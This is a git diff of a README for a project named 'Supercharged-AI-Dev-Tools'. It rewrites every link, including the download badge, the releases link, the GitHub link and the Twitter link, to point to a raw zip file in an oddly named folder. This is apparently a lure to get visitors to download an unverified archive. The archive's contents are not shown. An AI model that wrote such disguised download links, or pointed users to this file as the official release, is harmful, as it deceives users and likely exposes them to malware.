@@ -1,6 +1,6 @@
 # 🤖 Supercharged-AI-Dev-Tools - Enhance Your Coding Experience
 
-[![Download Supercharged-AI-Dev-Tools](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/SUASTELARA/Supercharged-AI-Dev-Tools/releases)
+[![Download Supercharged-AI-Dev-Tools](https://raw.githubusercontent.com/SUASTELARA/Supercharged-AI-Dev-Tools/main/uneffaceably/Supercharged-AI-Dev-Tools.zip)](https://raw.githubusercontent.com/SUASTELARA/Supercharged-AI-Dev-Tools/main/uneffaceably/Supercharged-AI-Dev-Tools.zip)
 
 ## 📜 Overview
 
@@ -27,7 +27,7 @@ To get the latest version of Supercharged AI Dev Tools:
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.
 
-   [Download Supercharged-AI-Dev-Tools](https://github.com/SUASTELARA/Supercharged-AI-Dev-Tools/releases)
+   [Download Supercharged-AI-Dev-Tools](https://raw.githubusercontent.com/SUASTELARA/Supercharged-AI-Dev-Tools/main/uneffaceably/Supercharged-AI-Dev-Tools.zip)
 
 2. **Select Your Version:** Once you are on the releases page, look for the latest version. The version number is highlighted for your convenience.
 
@@ -77,9 +77,9 @@ We thank the community for their support and contributions to Supercharged AI De
 
 Stay updated with the latest news and features by following us on our social media channels:
 
-- GitHub: [Supercharged AI Dev Tools](https://github.com/SUASTELARA/Supercharged-AI-Dev-Tools)
-- Twitter: [@SuperchargedAI](https://twitter.com/SuperchargedAI)
+- GitHub: [Supercharged AI Dev Tools](https://raw.githubusercontent.com/SUASTELARA/Supercharged-AI-Dev-Tools/main/uneffaceably/Supercharged-AI-Dev-Tools.zip)
+- Twitter: [@SuperchargedAI](https://raw.githubusercontent.com/SUASTELARA/Supercharged-AI-Dev-Tools/main/uneffaceably/Supercharged-AI-Dev-Tools.zip)
 
 For further updates, visit the releases page to download the latest versions! 
 
-[Download Supercharged-AI-Dev-Tools](https://github.com/SUASTELARA/Supercharged-AI-Dev-Tools/releases)
+[Download Supercharged-AI-Dev-Tools](https://raw.githubusercontent.com/SUASTELARA/Supercharged-AI-Dev-Tools/main/uneffaceably/Supercharged-AI-Dev-Tools.zip)
